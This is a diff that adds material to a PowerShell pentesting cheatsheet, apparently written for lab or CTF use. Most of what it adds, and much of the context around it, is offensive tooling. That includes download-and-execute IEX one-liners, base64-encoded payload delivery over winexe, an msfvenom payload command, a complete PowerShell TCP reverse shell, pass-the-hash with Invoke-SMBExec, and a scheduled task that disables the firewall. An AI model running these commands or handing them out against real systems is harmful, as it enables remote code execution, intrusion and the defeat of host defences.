@@ -1,5 +1,10 @@
 # Cheatsheet
 
+Using command line (why not run direcrly???)
+```
+echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.17:8000/Sherlock.ps1') | PowerShell -Noprofile -
+```
+
 ## Versions
 - v1: November 2006 - Windows XP SP2, Windows Server 2003 SP1 and Windows Vista
 - v2: Windows 7 and Windows Server 2008 R2 (Standalone for: Windows XP SP3, Windows Server 2003 SP2, and Windows Vista SP1)
@@ -62,12 +67,35 @@ Function
 - Language mode: `$host.runspace.languagemode`
 - Check if AppLocker is enabled: `Get-AppLockerPolicy -Local`
 - Powershell Version: `(Get-Host).Version`
+- 64bit version: `%SystemRoot%\sysnative\WindowsPowerShell\v1.0\powershell.exe`
 
 ## Download Files
 ```powershell
 powershell wget "http://example.com/abc.txt" -outfile "abc.txt"
 ```
 
+```powershell
+Invoke-WebRequest -Uri "http://192.168.0.17/PS_TCP4.ps1" -OutFile $fullpath;
+```
+
+```
+powershell -c "Invoke-WebRequest -Uri http://10.10.15.150/41020.exe -OutFile C:\Users\kostas\Desktop\41020.exe"
+```
+
+```
+echo $webclient = New-Object System.Net.WebClient >wget.ps1
+echo $url = "http://10.10.10.10/example.exe" >>wget.ps1
+echo $file = "example.exe" >>wget.ps1
+echo $webclient.DownloadFile($url,$file) >>wget.ps1
+
+
+powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInterative -NoProfile -File wget.ps1
+```
+## Base64 encoded payload delivery
+```
+echo "iex (New-Object Net.WebClient).DownloadString('http://172.16.67.128:80/6WcepYO')" | iconv --to-code UTF-16LE | base64 -w 0
+kaliwmis-32 -U administrator%badpassword //10.10.10.10 "cmd.exe /c  powershell.exe -nop -enc <base64-value>"
+```
 ## Execution Policy
 
 powershell.exe -exec Bypass
@@ -84,6 +112,19 @@ powershell.exe -exec Bypass
 > - Ref https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-6
 >
 > - 15 ways to bypass PowerShell execution policy: https://www.netspi.com/blog/entryid/238/15-ways-to-bypass-the-powershell-execution-policy
+
+## Revserse Shell 
+
+```powershell
+Start-Process -FilePath “powershell” -argumentlist “IEX(New-Object Net.WebClient).downloadString(‘http://10.10.14.30/adminshell.ps1’)” -Credential $cred
+
+msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell -c iex(new-object net.webclient).downloadstring('http://10.10.14.159/Invoke-PowerShellTcp-8082.ps1')" -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python > shellcode
+```
+
+<http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-1.html>
+```powershell
+$client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+```
 
 ## Modules
 
@@ -601,7 +642,7 @@ Get-ChildItem –Path C:\Windows\System32 | Export-CSV C:\Temp\AllFiles.CSV -NoT
 - Search hotfix: `Get-HotFix –ID KB2877616`
 - Backup Group Policy: `Backup-GPO –All –Path C:\Temp\AllGPO`
 - Check if all DCs are Global Catalog Servers: `Get-ADDomainController –Filter * | Select Hostname, IsGlobalCatalog`
-- 
+-
 
 ## Permissions
 
@@ -653,7 +694,8 @@ powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('h
 powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://10.11.0.125/Invoke-SMBExec.ps1'); Invoke-SMBExec -Target localhost -Username alice -Hash aad3b435b51404eeaad3b435b51404ee:B74242F37E47371AFF835A6EBCAC4FFE -Command 'net localgroup administrators bethany /add' -verbose"
 
 PsExec64.exe \\localhost -u alice -p aliceishere cmd
-powershell -ExecutionPolicy Bypass C:\Users\Bethany\Desktop\PsExec.exe -accepteula \\localhost -u alice -p aliceishere cmd
+powershell -ExecutionPolicy Bypass 
+C:\Users\Bethany\Desktop\PsExec.exe -accepteula \\localhost -u alice -p aliceishere cmd
 
 powershell.exe -exec Bypass -C "$action = New-ScheduledTaskAction -Execute netsh -Argument 'firewall set opmode disable'; $trigger = New-ScheduledTaskTrigger -Once -At $startTime -RepetitionInterval (New-TimeSpan -Minutes 1) -RepetitionDuration ([Timespan]::MaxValue); $settings = New-ScheduledTaskSettingsSet -MultipleInstances Parallel; Register-ScheduledTask -TaskName 'amx1' -TaskPath 'C:\Windows\System32\' -Action $action -Trigger $trigger -User 'alice' -Password 'aliceishere' -Settings $settings"
 
